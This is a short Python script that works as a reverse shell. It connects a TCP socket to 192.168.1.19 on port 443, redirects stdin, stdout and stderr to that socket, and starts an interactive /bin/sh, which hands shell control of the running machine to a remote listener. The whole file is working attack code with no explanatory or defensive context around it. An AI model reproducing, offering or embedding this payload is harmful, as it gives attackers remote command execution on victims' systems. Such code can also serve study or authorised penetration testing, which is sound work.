import socket
import subprocess
import os

# Create a socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the server
s.connect(("192.168.1.19", 443))

# Duplicate file descriptors for stdin, stdout, and stderr
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

# Execute a shell
subprocess.call(["/bin/sh", "-i"])
